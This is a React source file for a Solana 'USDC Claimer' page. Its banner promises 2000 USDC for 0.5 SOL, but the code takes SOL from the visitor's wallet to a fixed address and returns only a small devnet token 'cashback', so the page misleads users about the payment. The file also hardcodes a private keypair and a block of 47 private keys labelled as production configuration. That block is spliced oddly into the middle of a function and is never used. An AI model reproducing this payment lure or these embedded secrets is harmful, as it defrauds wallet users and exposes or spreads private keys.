/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "2VA2U2Vf9TdNb8FgAi1zHyn3RmFDgQVGLgT45VhjijLRxHJPpMfG9jK2irLrMiqadHzNoCLixjywbNL5UkugW9WJ"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "28f2ARGEnSwFGJwUtdo6mT6d4crqHDRpBfebbXsPi1PLuSmMwVx3UknrCLxqBFyxR5SRGVYc6jsUmAJ28M4FMQwP",
  "key1": "22LvbFEULHvPqCfozFhbcURgVs29yfxfQyiGFxqVZ39p45jP7HVdUJNrusGKx4pDcw4pWv6F2Z7DuDKFfuVSNCYj",
  "key2": "4ypMXeiWKgvXASMTTo1sQuxvy2ECvtvRGin5BPpMEuup83GoT2Hp5SYM6t9q7joPEDLsTntfTtbVnkjZ59vfZkDQ",
  "key3": "5zun3ADUYzhvJ6LCzZA66JSXeMGxML7cGbutCXRiVvBeFMb2BrrU8WTKit4zA3UDRiJBkt7LgTSX3kq9ijk5NWVV",
  "key4": "4HsFSjgBs9VVwzAzrcQknMhHHme3eSTEsoGQxJnHTBj7PiqUoPRWc1bcvbxPK4RUTuCEEsk4aCCdKyN4n4xzqLqc",
  "key5": "61e8kuPmiCvmvSEf9xBPmic9iKUTEEqJnBi2yXZ25331eXLTCyeKGXSpn8XRaJTKVXsLDHbw9AStV1rMgTe5hwJ5",
  "key6": "9x3nWfiwirdXCXagRFd9NuZ8HAeZm3uSUG8TFhcGYsZF6hsMU223ZShbeXMnWzghfcoY1W4UfJw1P3FLPHfaV7F",
  "key7": "4Rx3SV8GeFFGfKAAtqk4xQ1BLcGcFDWAgAiU1wh4kGaj2z5AwLQSYxb6EP52Q8o75Y4VgPapm9R33nTHPjJCQxMi",
  "key8": "59UsP6RtGGc597YFdyhADurHjJjgPUBnvLU6QN7aKk5s7CXAAfF483TynzYf6yVeeS6b6yDnpdjD6HK6KKyk4H9t",
  "key9": "2rAEUHT8uYoYycfc2W4zDoqjURfi3BipG4e4QwgAjpyaKWTwEwNqFe69si3STYkQwhxg1tGcsaYD2Z7mu7fN85F6",
  "key10": "5N2DWzEi2QBHkDeJVZWu7r3DgJeK7AGyuBJTkSNdwZJkFRy7jeFMGi9tbGLZfqieVzCSkThrZp2YXDjrkeJH6Zwg",
  "key11": "4AY1TKQTVygewgVzYgm8QDA3qWcifX954dpGUtTbmwYgvzEfbfCuGGnhkr9KbuzB4xDytimYky6KbwC4fRwM6DMn",
  "key12": "5uhdpQdwAZms6FX5TQV5XU4VEuLJpezzSFG1ugNWXfNVS8QYd7YwCLHUVF3w7Nff7X2io6RrwGs5EZxioyj9tbBq",
  "key13": "ezevuFxECxFVsQVBNg6kkWCiSjVzr5JTjGbsVXesJ3EJgFJnMt5sY8XCABqwrAzmdprbxBMvT7CR9J86pusTZ8t",
  "key14": "5KBsmHYSFTwN8nU8qqqrCTN8rh27eKH5nEFQ2MseJDNDBKtZ8hNcznYLTCuZMxMFETGU6FKXBcbj3nHBjogsX1uu",
  "key15": "BugE5nsdPR12FTHTUUz6Ez4EwX7shgp4JGCd2TSeA5CX3XrgG3ij8EHDuWAn9cZUTrGPCe59oDgbMFWMHZWNPRk",
  "key16": "3s4XA61g11GFGApQy2iXgaPWBBHqJWbB3o626YFL8WjQpSbFm6fi4SWyuY3ShiAeyCsBGBreVe62esLvEEyH5jCs",
  "key17": "5uvtr6EA8VydvtFtZSUEagHpUZqqjuS1bfCcZ1dHNjUV2MoqwTJt4Q9sRwG8acWoh9HwjebAqHoXzAbX63LCU6ew",
  "key18": "23F7anCAJfojpXDLMF4aiBvTkDVLZdxKBQMxJJr1U7mAZ2CmQ41SFKS9zTVEKKXmA7QfHif2FQ2M8SbHbZxAU9iP",
  "key19": "2vmzr71oMHzGSnERtYTzv2rwM6Pu4F6xFwTwSSQLvYsyeH2JxdtybzFTqAeHUoZL7GwiVohsvnT4dtqhyYceCuMH",
  "key20": "3wdg511ke9pdjQwUtWqqEntMbb8gszZS4GbvVt4neDrF2MmCrDtALuedPocRq5AJxWnbWCu1tXvwg7uoozb3jqr6",
  "key21": "pDRtS17uhFaDG199Rj9T2vuDmKeE96SyyBf7kQpo86yN38VemZ52VXaUtGxNF7vg34riogpdYHxZ78Hd9683TQ1",
  "key22": "3Fahyde45CYFfkbbyyG8jfs1LCQGYX6iG5LZT9E8Qx2RydL6ScTLPkacohgGacbZLztid7dLkLRJBuBw6Y3WtLs",
  "key23": "411VaiMTFygAM5TmLJtY6EvSxf4MVb4x2uJyKpyMNT36PKixgyswv6g9se8V89WypF16E77WW6gvcxt6b4qam94p",
  "key24": "3pKJGhvCRhC7D5TnEf6HvPPF9gGzEMbUfXXfFvx5hoMa6tsnt5eBs8nzzph2cmRngg7yWhAA9mT8Sm8rFWAphwPq",
  "key25": "5jGfGTaye4H6FUSAJo8x2tjtFPFmDrzayNGjBodxAiJiHinJYAy1t9kFaE1SpLwj52QCnwLwW6r2meeKRdz3C5Bt",
  "key26": "1Qq8Qxeba3EZh5h6vhatyLGgA1FWuqSzdKLwMqevbJS5ebnEJWotgk5U9Z1u5z3BcfVaVmC2KbPxZQSDr67cGCW",
  "key27": "5of9hCNPMs7MiHEGQDXSPNddmbbCavb6cJXyLA9rKS7RAR22Brfw2UmAyNeJtRpwg2FTht44BAhjfKyAeNVgy4br",
  "key28": "3s42hd2gBdxC1zURd6REYB5HNAssdQ1Ebzob2bikCmSPzQHctBF7AtjPhBoVPxJzZv87oTaMShtoxTp86jGKkiXF",
  "key29": "5dJp37hX8jHgGSzm9op2Vkaw1CAkp61Fgz32dAHGBB8nDzuboQQZ7PZe5MW2ZFixyvGGb4xYkb1NYvnLM3pEkLML",
  "key30": "211gwgVgyNh7GL9LRUCWxTvGknsgKZsBkB3frySYVgagy1Yr68kQxry7w9ZW3xm9JSEBCd9u9YW4mjWbZSpKRh9Q",
  "key31": "3te669bPSxsCjVhbcp9jcfJPWnz45C3srhBKMnvV4xDgdiHrZBzX1VYjNKP5HKC5xPwPxqG7xtGyVhXUP83C1DBc",
  "key32": "dXMZsogUUSaEyC2eruaUPwyLrkoLwyqJm98VU813a2FXA8GNhpKJc1QaWndwrzvELpADpbhTjxsfhct9QcN5Lkf",
  "key33": "5DtjXZieFhvUEEhYi1myQCHDHFUzLoyfiBvqr91YWeLy2X4tqhjrbwSv6m5wHXSMckUSGCzdMhyuqtphhEFqdvCd",
  "key34": "xdtwVXdZZ26kufRwsEf2dAqtD4sz3AttCBTm4mmcy8Z5BncANdWTsopbaQNhQ1WG9LvSQhGXWywSg5Pw7zXZq1T",
  "key35": "ZFhzzJwiaWXNSzPhrL8bDgBs5nRTducUmQLAkhzP8ZGYHCkYwGsaWunNWsMLUpgn3Duqrb98cKJ7XyG6CrT3pCM",
  "key36": "2ehWNuKcaqhUSAdNh4sE6SQKSXEXuKxQUs3SjHuebYJbewu68LMa3hMaPXbj5oRiEELFTgULLTUwWS4QHTFFfb8b",
  "key37": "2pFPGvnRKvn3EnXib7txZvNFRKBt7Xy2czK1PttdhNFkQuhx2ENhHC9Lzoqfk66obQ7LMFcNZhz9X9UtJ79X6qtN",
  "key38": "5wKwTPe1f9CYi1krWHDAgE1EZ3nd1yCpHxFWpMWiy5uvetwDpaqtXsTz8AcJXk5GZnFunrACeD2BPU8TCUVZ7P5a",
  "key39": "g7ezfYSLRdHawe9SYUbCb887yK7C25vx2X3Gp3x6WeM8i5Kh645y5Qcbr4yzCECKzk8ZSeZUaZrV5t9Mj3dWcTu",
  "key40": "5Q7Htqj2bZ1TY6a5gKbtGwEAtMWVWTs4D8JHzKG8dzdYECgbXL9aefCGjZLbtoA9qXb9CdPvh3pcZx8PAn97k9b3",
  "key41": "5becQ9JFZe6LsYQzPiAL6N1JAh6zvt7TmLS4EbCuQSdCN398R6iNeXoQKeqqcDjhXhN5ATicnb1bKNNwq7CUZwgE",
  "key42": "3hrt446XFcgHrEqH9wmLi8nw2d3RsEUGft7wjAayqfBbnLCoGf2t3ZrS1W9fepNR3Sbomdq2UV6HQcNe6gFKpth2",
  "key43": "2XZC5WunJLD9v61AoDSpAmyeuUePWFsckRi7N6f1q3aRJfEiMyr7RmTyEoYvjqzRfLaF3MMD3aZWtMkk8gmhDFcQ",
  "key44": "49uTXFps9YKdiwjM9JFmCnRFejSu76XusZ2j3CWwsRXFSKTSy49AyFFQrRQZ5rCTNZU1wg9bimww9CzFmN4pwKcV",
  "key45": "64op78aPdtXzzYEN5h2cbfxncKocqzi8rhssHf7q3M1FPZFcocSorkrwSB3KDEVW2EPtR9hJrwQmUT7XiCRS3Wxh",
  "key46": "5qcxKp3exVrK36ZzgfWdVqZDdnfrVzFS7ir1UntbntYMZ3cAyoSkkpTotPwe5q6tB5BwE3DtUXLyQu2vhypJ3xxx"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
